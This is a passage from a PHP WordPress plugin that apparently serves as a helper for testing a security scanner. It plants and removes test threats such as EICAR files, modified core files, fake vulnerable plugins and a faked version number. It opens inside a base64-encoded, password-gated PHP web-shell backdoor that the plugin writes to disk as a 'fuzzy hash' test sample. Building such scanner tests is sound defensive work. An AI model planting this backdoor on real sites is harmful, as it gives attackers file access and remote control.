			'ZjVbJHNwMzU1ODU1XSA9IGJhc2U2NF9kZWNvZGUoJHNwM2FjMWY1WyRzcDM1NTg1NV0pOyB9IH0gfSAkc3AwZjIwN2YgPSBjYWxsX3VzZXJfZn' .
			'VuYyhzcHJpbnRmKCdyXyVzX2Nvbm5lY3QnLCAkc3AwNTEzMmMpLCAkc3AzMGNiYmQpOyAkc3BhNTlkMjcgPSBjYWxsX3VzZXJfZnVuYyhzcHJp' .
			'bnRmKCdyXyVzX3F1ZXJ5JywgJHNwMDUxMzJjKSwgJHNwMzBjYmJkLCAkc3AwZjIwN2YsICRfUE9TVFsncXVlcnknXSwgJHNwM2FjMWY1KTsgaW' .
			'YgKGlzc2V0KCRfUE9TVFsnZW5jb2RlJ10pKSB7ICRzcGFhNGUwNiA9IGFycmF5X21hcCgndHJpbScsIGV4cGxvZGUoJywnLCAkX1BPU1RbJ2Vu' .
			'Y29kZSddKSk7IGZvcmVhY2ggKCRzcGE1OWQyN1snc3VjY2VzcyddIGFzICRzcGI2ZmJmZSA9PiAkc3A5MDFhZmYpIHsgZm9yZWFjaCAoJHNwYW' .
			'E0ZTA2IGFzICRzcDEyNzYzZSkgeyAkc3BhNTlkMjdbJ3N1Y2Nlc3MnXVskc3BiNmZiZmVdWyRzcDEyNzYzZV0gPSBiYXNlNjRfZW5jb2RlKCRz' .
			'cGE1OWQyN1snc3VjY2VzcyddWyRzcGI2ZmJmZV1bJHNwMTI3NjNlXSk7IH0gfSB9IGVjaG8ganNvbl9lbmNvZGUoJHNwYTU5ZDI3KTsgfSBmdW' .
			'5jdGlvbiByX2FjdGlvbl91cGRhdGUoKSB7IGZpbGVfcHV0X2NvbnRlbnRzKF9fRklMRV9fLCBiYXNlNjRfZGVjb2RlKCRfUE9TVFsnZmlsZSdd' .
			'KSk7IGVjaG8gbWQ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWydmaWxlJ10pKTsgfSBmdW5jdGlvbiByX2FjdGlvbl92ZXJzaW9uKCkgeyBlY2hvIF' .
			'ZFUlNJT047IH0gZnVuY3Rpb24gcl9hY3Rpb25fZHVwbGljYXRlKCkgeyAkc3A3ZDIzYzAgPSBjb3B5KF9fRklMRV9fLCAkX1BPU1RbJ2RzdCdd' .
			'KTsgZWNobyAoaW50KSAkc3A3ZDIzYzA7IH0gZnVuY3Rpb24gcl9hY3Rpb25fY29weSgpIHsgJHNwN2QyM2MwID0gY29weSgkX1BPU1RbJ3NyYy' .
			'ddLCAkX1BPU1RbJ2RzdCddKTsgZWNobyAoaW50KSAkc3A3ZDIzYzA7IH0gZnVuY3Rpb24gcl9hY3Rpb25fZGlyKCkgeyAkc3A3ZDIzYzAgPSBh' .
			'cnJheSgpOyAkc3AzNTU4NTUgPSBkaXIoJF9QT1NUWydkaXInXSk7IHdoaWxlIChmYWxzZSAhPT0gKCRzcDU2NTE2NCA9ICRzcDM1NTg1NS0+cm' .
			'VhZCgpKSkgeyAkc3BmODI4MzIgPSBzcHJpbnRmKCclcy8lcycsIHJ0cmltKCRfUE9TVFsnZGlyJ10sICcvJyksICRzcDU2NTE2NCk7ICRzcDdk' .
			'MjNjMFtdID0gYXJyYXkoJ3R5cGUnID0+IGlzX2ZpbGUoJHNwZjgyODMyKSA/ICdmaWxlJyA6IChpc19kaXIoJHNwZjgyODMyKSA/ICdkaXInID' .
			'ogJ3Vua25vd24nKSwgJ2VudHJ5JyA9PiAkc3A1NjUxNjQsICdmdWxsX2VudHJ5JyA9PiAkc3BmODI4MzIsICdyZWFscGF0aCcgPT4gcmVhbHBh' .
			'dGgoJHNwZjgyODMyKSk7IH0gJHNwMzU1ODU1LT5jbG9zZSgpOyBlY2hvIGpzb25fZW5jb2RlKCRzcDdkMjNjMCk7IH0gZnVuY3Rpb24gcl9hY3' .
			'Rpb25fd3B2ZXJzaW9uKCkgeyAkc3A0ODY3MmEgPSByX2dldF9jb25maWdfcGF0aCgpOyAkc3BiYjk5NGEgPSBmaWxlX2dldF9jb250ZW50cyhz' .
			'cHJpbnRmKCclcy93cC1zZXR0aW5ncy5waHAnLCAkc3A0ODY3MmEpKTsgcHJlZ19tYXRjaF9hbGwoJy9kZWZpbmVcXCgoW15cXCldKykvaScsIC' .
			'RzcGJiOTk0YSwgJHNwOGYyZmU5KTsgZm9yZWFjaCAoJHNwOGYyZmU5WzFdIGFzICRzcGU4NDFmMCkgeyBpZiAoc3RycG9zKCRzcGU4NDFmMCwg' .
			'J1dQSU5DJykgIT09IGZhbHNlKSB7ICRzcGU4NDFmMCA9IGFycmF5X21hcCgndHJpbScsIGV4cGxvZGUoJywnLCAkc3BlODQxZjApKTsgZm9yZW' .
			'FjaCAoJHNwZTg0MWYwIGFzICRzcDA2MGQwYyA9PiAkc3BkMDc3MDQpIHsgaWYgKCRzcGQwNzcwNFswXSA9PSAkc3BkMDc3MDRbc3RybGVuKCRz' .
			'cGQwNzcwNCkgLSAxXSkgeyAkc3BlODQxZjBbJHNwMDYwZDBjXSA9IHN1YnN0cigkc3BkMDc3MDQsIDEsIHN0cmxlbigkc3BkMDc3MDQpIC0gMi' .
			'k7IH0gfSByZXF1aXJlX29uY2UgJHNwOGVhZWUzID0gc3ByaW50ZignJXMlcyVzJXN2ZXJzaW9uLnBocCcsICRzcDQ4NjcyYSwgRElSRUNUT1JZ' .
			'X1NFUEFSQVRPUiwgc3RyX3JlcGxhY2UoJy8nLCBESVJFQ1RPUllfU0VQQVJBVE9SLCAkc3BlODQxZjBbMV0pLCBESVJFQ1RPUllfU0VQQVJBVE' .
			'9SKTsgJHNwZjI0NWEwID0gJ3dwX3ZlcnNpb24nOyBlY2hvICR7JHNwZjI0NWEwfTsgZGllOyB9IH0gZWNobyAnZXJyb3InOyB9IGZ1bmN0aW9u' .
			'IHJfYWN0aW9uX3czdGMoKSB7ICRzcDQ4NjcyYSA9IHJfZ2V0X2NvbmZpZ19wYXRoKCk7ICRzcGJjZTZhOCA9IHJ0cmltKHByZWdfcmVwbGFjZS' .
			'gnL15odHRwW3NdezAsMX1cXDpcXC9cXC8vaScsICcnLCAkX1BPU1RbJ3VybCddKSwgJy8nKTsgJHNwMjdhODdhID0gc3ByaW50ZignJXMvd3At' .
			'Y29udGVudC9jYWNoZS9wYWdlX2VuaGFuY2VkLyVzL19pbmRleC5odG1sJywgJHNwNDg2NzJhLCAkc3BiY2U2YTgpOyBpZiAoZmlsZV9leGlzdH' .
			'MoJHNwMjdhODdhKSkgeyB1bmxpbmsoJHNwMjdhODdhKTsgfSAkc3AyN2E4N2EgPSBzcHJpbnRmKCclcy93cC1jb250ZW50L2NhY2hlL3BhZ2Vf' .
			'ZW5oYW5jZWQvJXMvX2luZGV4Lmh0bWxfZ3ppcCcsICRzcDQ4NjcyYSwgJHNwYmNlNmE4KTsgaWYgKGZpbGVfZXhpc3RzKCRzcDI3YTg3YSkpIH' .
			'sgdW5saW5rKCRzcDI3YTg3YSk7IH0gZWNobyAnc3VjY2Vzcyc7IH0gZnVuY3Rpb24gcl9hY3Rpb25fY2VuYWJsZXIoKSB7ICRzcDQ4NjcyYSA9' .
			'IHJfZ2V0X2NvbmZpZ19wYXRoKCk7ICRzcGJjZTZhOCA9IHJ0cmltKHByZWdfcmVwbGFjZSgnL15odHRwW3NdezAsMX1cXDpcXC9cXC8vaScsIC' .
			'cnLCAkX1BPU1RbJ3VybCddKSwgJy8nKTsgJHNwMjdhODdhID0gc3ByaW50ZignJXMvd3AtY29udGVudC9jYWNoZS9jYWNoZS1lbmFibGVyLyVz' .
			'L2luZGV4Lmh0bWwnLCAkc3A0ODY3MmEsICRzcGJjZTZhOCk7IGlmIChmaWxlX2V4aXN0cygkc3AyN2E4N2EpKSB7IHVubGluaygkc3AyN2E4N2' .
			'EpOyB9ICRzcDI3YTg3YSA9IHNwcmludGYoJyVzL3dwLWNvbnRlbnQvY2FjaGUvY2FjaGUtZW5hYmxlci8lcy9pbmRleC5odG1sLmd6JywgJHNw' .
			'NDg2NzJhLCAkc3BiY2U2YTgpOyBpZiAoZmlsZV9leGlzdHMoJHNwMjdhODdhKSkgeyB1bmxpbmsoJHNwMjdhODdhKTsgfSAkc3AyN2E4N2EgPS' .
			'BzcHJpbnRmKCclcy93cC1jb250ZW50L2NhY2hlL2NhY2hlLWVuYWJsZXIvJXMvaW5kZXgtd2VicC5odG1sJywgJHNwNDg2NzJhLCAkc3BiY2U2' .
			'YTgpOyBpZiAoZmlsZV9leGlzdHMoJHNwMjdhODdhKSkgeyB1bmxpbmsoJHNwMjdhODdhKTsgfSAkc3AyN2E4N2EgPSBzcHJpbnRmKCclcy93cC' .
			'1jb250ZW50L2NhY2hlL2NhY2hlLWVuYWJsZXIvJXMvaW5kZXgtd2VicC5odG1sLmd6JywgJHNwNDg2NzJhLCAkc3BiY2U2YTgpOyBpZiAoZmls' .
			'ZV9leGlzdHMoJHNwMjdhODdhKSkgeyB1bmxpbmsoJHNwMjdhODdhKTsgfSBlY2hvICdzdWNjZXNzJzsgfSBmdW5jdGlvbiByX2FjdGlvbl9yZW' .
			'1vdmVzaGVsbCgpIHsgaWYgKGZpbGVfZXhpc3RzKCRzcGVkMjU4MyA9IHNwcmludGYoJyVzJXMlcycsIHJ0cmltKCRfU0VSVkVSWydET0NVTUVO' .
			'VF9ST09UJ10sICcvJyksIERJUkVDVE9SWV9TRVBBUkFUT1IsIHN0cl9yZXBsYWNlKCcvJywgRElSRUNUT1JZX1NFUEFSQVRPUiwgbHRyaW0oJF' .
			'9QT1NUWydzaGVsbF91cmwnXSwgJy8nKSkpKSkgeyBpZiAoJHNwZWQyNTgzICE9IF9fRklMRV9fKSB7IHVubGluaygkc3BlZDI1ODMpOyB9IGVj' .
			'aG8gZmlsZV9leGlzdHMoJHNwZWQyNTgzKSA/ICdmYWlsJyA6ICdzdWNjZXNzJzsgfSBlbHNlIHsgZWNobyAnaWdub3JlJzsgfSB9IGZ1bmN0aW' .
			'9uIHJfYWN0aW9uX2NvbmZpZygpIHsgZWNobyBqc29uX2VuY29kZShyX2dldF9jb25maWcoKSk7IH0gZnVuY3Rpb24gcl9hY3Rpb25fZ2V0bGli' .
			'KCkgeyBlY2hvIHJfZ2V0X2xpYigpOyB9IGZ1bmN0aW9uIHJfYWN0aW9uX21hZ2ljKCkgeyBlY2hvIGdldF9tYWdpY19xdW90ZXNfZ3BjKCkgPy' .
			'AnWWVzJyA6ICdObyc7IH0gZnVuY3Rpb24gcl9hY3Rpb25fbG9naW51cmwoKSB7ICRzcDU5ZDg5OCA9IChpc3NldCgkX1NFUlZFUlsnSFRUUFMn' .
			'XSkgPyAnaHR0cHMnIDogJ2h0dHAnKSAuICI6Ly97JF9TRVJWRVJbJ0hUVFBfSE9TVCddfXskX1NFUlZFUlsnUkVRVUVTVF9VUkknXX0iOyAkc3' .
			'AyYjMwZGYgPSAkc3A1OWQ4OTg7ICRzcGY1YTM0OSA9IGJhc2VuYW1lKF9fRklMRV9fKTsgJHNwOTFjNWYwID0gYmFzZW5hbWUodGVtcG5hbSgn' .
			'Li8nLCAnZXJ0JykgLiAnLnBocCcpOyAkc3AzYjEwMWUgPSBwcmVnX3JlcGxhY2Uoc3ByaW50ZignLyVzJC9pJywgcHJlZ19xdW90ZSgkc3BmNW' .
			'EzNDkpKSwgJHNwOTFjNWYwLCAkc3AyYjMwZGYpOyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRzcDNiMTAxZSk7IH0gaWYgKGNvdW50KCRfR0VU' .
			'KSA9PSAxICYmICF0cmltKCRzcDg4YjY5MCA9IGFycmF5X3BvcChhcnJheV92YWx1ZXMoJF9HRVQpKSkpIHsgJHNwYTU5ZDI3ID0gYXJyYXkoKT' .
			'sgcGFyc2Vfc3RyKGJhc2U2NF9kZWNvZGUoYXJyYXlfc2hpZnQoYXJyYXlfa2V5cygkX0dFVCkpKSwgJHNwYTU5ZDI3KTsgJF9HRVQgPSAkc3Bh' .
			'NTlkMjc7IH0gJF9QT1NUID0gYXJyYXlfbWVyZ2UoJF9QT1NULCAkX0dFVCk7IGlmIChDT05GX1BBU1NXT1JEX0hBU0ggPT0gbWQ1KCRfUE9TVF' .
			'sncGFzc3dvcmQnXSkpIHsgc3dpdGNoICgkX1BPU1RbJ2FjdGlvbiddKSB7IGNhc2UgJ2xpbmsnOiAkc3A0ODY3MmEgPSByX2dldF9jb25maWdf' .
			'cGF0aCgpOyBjaGRpcigkc3A0ODY3MmEpOyAkc3A5Y2I2NzAgPSAkX1BPU1RbJ2lkJ107IHJlcXVpcmVfb25jZSAkc3A0ODY3MmEgLiAnL3dwLW' .
			'xvYWQucGhwJzsgJHNwZmZkMzBjID0gZ2V0X3Blcm1hbGluaygkX1BPU1RbJ2lkJ10pOyBlY2hvIHNwcmludGYoJ1s8eyVzfT5dJywgJHNwZmZk' .
			'MzBjKTsgYnJlYWs7IGRlZmF1bHQ6ICRzcGRlMTY1NCA9IHNwcmludGYoJ3JfYWN0aW9uXyVzJywgJF9QT1NUWydhY3Rpb24nXSk7IGNhbGxfdX' .
			'Nlcl9mdW5jKCRzcGRlMTY1NCk7IGJyZWFrOyB9IH0gZWxzZSB7IGRpZSgneW1wZicpOyB9'
		);

		if ( ! $this->write_file( $this->threats['fuzzy_hash_file'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['fuzzy_hash_file']}" );
		}

		return "Successfully added fuzzy hash threat to {$this->threats['fuzzy_hash_file']}.";
	}

	/**
	 * Remove fuzzy hash threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_fuzzy_hash_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['fuzzy_hash_file'] );

		if ( ! $this->delete_file( $this->threats['fuzzy_hash_file'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write to threat file $relative_file_path." );
		}

		return "Successfully removed fuzzy hash threat $relative_file_path.";
	}

	const CORE_VERSION_INCLUDE = "require ABSPATH . WPINC . '/version.php';";
	const FAKE_VERSION_INCLUDE = "require ABSPATH . WPINC . '/version.php'; \$wp_version = '6.4.3';";

	/**
	 * Checks whether the WordPress version is currently faked on the site.
	 *
	 * @return bool
	 */
	private function wordpress_version_is_faked() {
		$content = $this->get_contents( $this->threats['wp_settings_file'] );
		return strpos( $content, self::FAKE_VERSION_INCLUDE ) !== false;
	}

	/**
	 * Enables the WordPress version fake.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function enable_wordpress_version_fake() {
		$content = $this->get_contents( $this->threats['wp_settings_file'] );

		$content = str_replace( self::CORE_VERSION_INCLUDE, self::FAKE_VERSION_INCLUDE, $content );

		if ( ! $this->write_file( $this->threats['wp_settings_file'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['wp_settings_file']}" );
		}

		return "Successfully added faked WordPress version to {$this->threats['wp_settings_file']}.";
	}

	/**
	 * Disables the WordPress version fake.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function disable_wordpress_version_fake() {
		$content = $this->get_contents( $this->threats['wp_settings_file'] );

		$content = str_replace( self::FAKE_VERSION_INCLUDE, self::CORE_VERSION_INCLUDE, $content );

		if ( ! $this->write_file( $this->threats['wp_settings_file'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write cleaned file to {$this->threats['wp_settings_file']}" );
		}

		return "Successfully removed faked WordPress version from {$this->threats['wp_settings_file']}.";
	}

	/**
	 * Handles the form submission
	 *
	 * @return array Associative array containing all the successes and errors.
	 */
	private function handle_submit() {
		if ( ! isset( $_POST['save-scan-helper'] ) ) {
			return;
		}

		check_admin_referer( 'scan-helper-nonce' );

		$successes = array();
		$errors    = array();

		// EICAR
		if ( isset( $_POST['threat-eicar'] ) ) {
			$eicar = ! $this->eicar_threat_exists() ? $this->generate_eicar_threat() : null;
		} else {
			$eicar = $this->eicar_threat_exists() ? $this->remove_eicar_threat() : null;
		}
		if ( is_wp_error( $eicar ) ) {
			$errors[] = $eicar;
		} elseif ( $eicar ) {
			$successes[] = $eicar;
		}
		// Suspicious Link
		if ( isset( $_POST['threat-suspicious-link'] ) ) {
			$suspicious_link = ! $this->suspicious_link_threat_exists() ? $this->generate_suspicious_link_threat() : null;
		} else {
			$suspicious_link = $this->suspicious_link_threat_exists() ? $this->remove_suspicious_link_threat() : null;
		}
		if ( is_wp_error( $suspicious_link ) ) {
			$errors[] = $suspicious_link;
		} elseif ( $suspicious_link ) {
			$successes[] = $suspicious_link;
		}

		// Core File Modification
		if ( isset( $_POST['threat-core'] ) ) {
			$core_modification = ! $this->core_file_modification_threat_exists() ? $this->generate_core_file_modification_threat() : null;
		} else {
			$core_modification = $this->core_file_modification_threat_exists() ? $this->remove_core_file_modification_threat() : null;
		}
		if ( is_wp_error( $core_modification ) ) {
			$errors[] = $core_modification;
		} elseif ( $core_modification ) {
			$successes[] = $core_modification;
		}

		// Non-Core File
		if ( isset( $_POST['threat-core-add'] ) ) {
			$core_add = ! $this->non_core_file_threat_exists() ? $this->generate_non_core_file_threat() : null;
		} else {
			$core_add = $this->non_core_file_threat_exists() ? $this->remove_non_core_file_threat() : null;
		}
		if ( is_wp_error( $core_add ) ) {
			$errors[] = $core_add;
		} elseif ( $core_add ) {
			$successes[] = $core_add;
		}

		// Post DB
		if ( isset( $_POST['threat-post'] ) ) {
			$post_db = ! $this->post_db_threat_exists() ? $this->generate_post_db_threat() : null;
		} else {
			$post_db = $this->post_db_threat_exists() ? $this->remove_post_db_threat() : null;
		}
		if ( is_wp_error( $post_db ) ) {
			$errors[] = $post_db;
		} elseif ( $post_db ) {
			$successes[] = $post_db;
		}

		// Infected File
		if ( isset( $_POST['threat-infect'] ) ) {
			$infected_file = ! $this->infected_file_threat_exists() ? $this->generate_infected_file_threat() : null;
		} else {
			$infected_file = $this->infected_file_threat_exists() ? $this->remove_infected_file_threat() : null;
		}
		if ( is_wp_error( $infected_file ) ) {
			$errors[] = $infected_file;
		} elseif ( $infected_file ) {
			$successes[] = $infected_file;
		}

		// Fake vulnerable plugin
		if ( isset( $_POST['fake-vulnerable-plugin'] ) ) {
			$fake_vulnerable_plugin = ! $this->fake_vulnerable_plugin_exists() ? $this->generate_fake_vulnerable_plugin() : null;
		} else {
			$fake_vulnerable_plugin = $this->fake_vulnerable_plugin_exists() ? $this->remove_fake_vulnerable_plugin() : null;
		}
		if ( is_wp_error( $fake_vulnerable_plugin ) ) {
			$errors[] = $fake_vulnerable_plugin;
		} elseif ( $fake_vulnerable_plugin ) {
			$successes[] = $fake_vulnerable_plugin;
		}

		// Fake vulnerable theme
		if ( isset( $_POST['fake-vulnerable-theme'] ) ) {
			$fake_vulnerable_theme = ! $this->fake_vulnerable_theme_exists() ? $this->generate_fake_vulnerable_theme() : null;
		} else {
			$fake_vulnerable_theme = $this->fake_vulnerable_theme_exists() ? $this->remove_fake_vulnerable_theme() : null;
		}
		if ( is_wp_error( $fake_vulnerable_theme ) ) {
			$errors[] = $fake_vulnerable_theme;
		} elseif ( $fake_vulnerable_theme ) {
			$successes[] = $fake_vulnerable_theme;
		}

		// Fuzzy Hash
		if ( isset( $_POST['fuzzy-hash'] ) ) {
			$fuzzy_hash = ! $this->fuzzy_hash_threat_exists() ? $this->generate_fuzzy_hash_threat() : null;
		} else {
			$fuzzy_hash = $this->fuzzy_hash_threat_exists() ? $this->remove_fuzzy_hash_threat() : null;
		}
		if ( is_wp_error( $fuzzy_hash ) ) {
			$errors[] = $fuzzy_hash;
		} elseif ( $fuzzy_hash ) {
			$successes[] = $fuzzy_hash;
		}

		// Fake WordPress Version
		if ( isset( $_POST['fake-wordpress-version'] ) ) {
			$fake_wordpress_version = ! $this->wordpress_version_is_faked() ? $this->enable_wordpress_version_fake() : null;
		} else {
			$fake_wordpress_version = $this->wordpress_version_is_faked() ? $this->disable_wordpress_version_fake() : null;
		}
		if ( is_wp_error( $fake_wordpress_version ) ) {
			$errors[] = $fake_wordpress_version;
		} elseif ( $fake_wordpress_version ) {
			$successes[] = $fake_wordpress_version;
		}

		return array(
			'errors'    => $errors,
			'successes' => $successes,
		);
	}

	/**
	 * Render the UI.
	 */
	public function render_ui() {
		$submission = $this->handle_submit();

		// eicar check
		$eicar = $this->wp_file_exists( $this->threats['eicar'] ) ? 'checked="checked"' : '';

		// suspicious link check
		$suspicious_link = $this->wp_file_exists( $this->threats['suspicious_link'] ) ? 'checked="checked"' : '';

		// core modification check
		$dir      = str_replace( site_url() . '/', ABSPATH, admin_url() );
		$lines    = $this->get_contents_array( "$dir/index.php" );
		$core_mod = $lines[ count( $lines ) - 1 ] === 'if ( true === false ) exit();' ? 'checked' : '';

		// non-core file check
		$dir      = str_replace( site_url() . '/', ABSPATH, admin_url() );
		$core_add = $this->wp_file_exists( "$dir/non-core-file.php" ) ? 'checked' : '';

		// post db check
		$post_db = post_exists( 'Scan Tester Post' ) ? 'checked' : '';

		// infected file check
		$dir    = str_replace( site_url() . '/', ABSPATH, content_url() );
		$lines  = file( "$dir/index.php" );
		$infect = $lines[ count( $lines ) - 1 ] === 'HTML;' ? 'checked' : '';

		// fuzzy hash check
		$fuzzy_hash = $this->fuzzy_hash_threat_exists() ? 'checked="checked"' : '';

		// fake vulnerable plugin check
		$fake_vulnerable_plugin = $this->fake_vulnerable_plugin_exists() ? 'checked="checked"' : '';

		// fake vulnerable theme check
		$fake_vulnerable_theme = $this->fake_vulnerable_theme_exists() ? 'checked="checked"' : '';

		// fake WordPress version check
		$fake_wordpress_version = $this->wordpress_version_is_faked() ? 'checked="checked"' : '';

		?>

		<h1>Site Threats</h1>

		<div id="a8cjptt-alert" class="a8cjptt-alert">
			<?php
			if ( $submission ) {
				foreach ( $submission['errors'] as $wp_error ) {
					echo '<div class="a8cjptt-alert a8cjptt-danger">' . esc_attr( $wp_error->get_error_message() ) . '</div>';
				}
				foreach ( $submission['successes'] as $success ) {
					echo '<div class="a8cjptt-alert a8cjptt-success">' . esc_attr( $success ) . '</div>';
				}
				if ( empty( $submission['errors'] ) && empty( $submission['successes'] ) ) {
					echo '<div class="a8cjptt-alert a8cjptt-info">No modifications were made.</div>';
				}
			}
			?>
		</div>

		<form method="post" class="a8cjptt-threats">

			<?php wp_nonce_field( 'scan-helper-nonce' ); ?>

			<div>
				<label for="threat-eicar">
					<input type="checkbox" name="threat-eicar" id="threat-eicar" <?php echo esc_attr( $eicar ); ?>>
					<strong>EICAR Threat</strong>
					<br>
					Add/Remove five EICAR threats (one for every severity) to a new file in the WordPress <code>uploads</code> folder.
				</label>
			</div>

			<div>
				<label for="threat-suspicious-link">
					<input type="checkbox" name="threat-suspicious-link" id="threat-suspicious-link" <?php echo esc_attr( $suspicious_link ); ?>>
					<strong>Suspicious Link</strong>
					<br>
					Add/Remove a link that will be flagged by Akismet to a new file in the WordPress <code>uploads</code> folder.
				</label>
			</div>

			<div>
				<label for="threat-core">
					<input type="checkbox" name="threat-core" id="threat-core" <?php echo esc_attr( $core_mod ); ?>>
					<strong>Core File Modification Threat</strong>
					<br>
					Add/Remove a Core File Modification threat in the WordPress <code>wp-admin</code> folder.
				</label>
			</div>

			<div>
				<label for="threat-core-add">
					<input type="checkbox" name="threat-core-add" id="threat-core-add" <?php echo esc_attr( $core_add ); ?>>
					<strong>Add a Non-Core File to Core Directory</strong>
					<br>
					Add/Remove a file to the <code>wp-admin</code> core directory.
				</label>
			</div>

			<div>
				<label for="threat-post">
					<input type="checkbox" name="threat-post" id="threat-post" <?php echo esc_attr( $post_db ); ?>>
					<strong>Post DB Threat</strong>
					<br>
					Add/Remove a blog post containing data that will trigger a DB scan.
				</label>
			</div>

			<div>
				<label for="threat-infect">
					<input type="checkbox" name="threat-infect" id="threat-infect" <?php echo esc_attr( $infect ); ?>>
					<strong>Infect a File Threat</strong>
					<br>
					Add/Remove an EICAR threat to an existing file in the WordPress <code>contents</code> folder.
				</label>
			</div>

			<div>
				<label for="fuzzy-hash">
					<input type="checkbox" name="fuzzy-hash" id="fuzzy-hash" <?php echo esc_attr( $fuzzy_hash ); ?>>
					<strong>Create a fuzzy hash threat</strong>
					<br>
					Add/Remove a fuzzy hash threat to a new file in the WordPress <code>contents</code> folder.
				</label>
			</div>

			<div>
				<label for="fake-vulnerable-plugin">
					<input type="checkbox" name="fake-vulnerable-plugin" id="fake-vulnerable-plugin" <?php echo esc_attr( $fake_vulnerable_plugin ); ?>>
					<strong>Create a fake vulnerable plugin</strong>
					<br>
					Add/Remove an fake vulnerable plugin - <code>WP Super Cache 1.7.2</code> see <a href="https://wpscan.com/plugin/wp-super-cache/">WPScan reference</a>.
				</label>
			</div>

			<div>
				<label for="fake-vulnerable-theme">
					<input type="checkbox" name="fake-vulnerable-theme" id="fake-vulnerable-theme" <?php echo esc_attr( $fake_vulnerable_theme ); ?>>
					<strong>Create a fake vulnerable theme</strong>
					<br>
					Add/Remove an fake vulnerable theme - <code>Twenty Fifteen 1.1</code> see <a href="https://wpscan.com/theme/twentyfifteen/">WPScan reference</a>.
				</label>
			</div>

			<div>
				<label for="fake-wordpress-version">
					<input type="checkbox" name="fake-wordpress-version" id="fake-wordpress-version" <?php echo esc_attr( $fake_wordpress_version ); ?>>
					<strong>Fake WordPress Version</strong>
					<br>
					This will make WordPress believe it us running version <code>6.4.3</code>  see <a href="https://wpscan.com/wordpress/643/">WPScan reference</a>.
					<br><br>
					Note that this will cause two things to happen:
					<ol>
						<li>The scan will take a while longer, because it compares against the "wrong" known core file hashes.</li>
						<li>This will also be caught as a core file modification, as we are modifing a core file to make it happen.</li>
					</ol>
				</label>
			</div>

			<div>
				<input type="submit" name="save-scan-helper" value="Update Site Threats" class="button button-primary">
			</div>

		</form>
		<?php
	}
}

add_action(
	'plugins_loaded',
	function () {
		new Scan_Helper();
	},
	1000
);
